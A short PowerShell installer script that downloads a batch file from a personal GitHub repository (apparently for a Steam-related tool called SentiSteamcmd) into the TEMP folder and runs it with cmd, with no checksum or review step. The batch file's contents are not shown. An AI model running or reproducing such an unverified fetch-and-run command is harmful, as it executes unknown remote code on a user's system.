# install.ps1
$batUrl = "https://raw.githubusercontent.com/augustmunitripathi12-sudo/SentiSteamcmd/main/main.bat"
$batFile = "$env:TEMP\main.bat"

# Download the batch file
Invoke-WebRequest $batUrl -OutFile $batFile

# Run it in CMD
Start-Process cmd -ArgumentList "/c `"$batFile`"" -Wait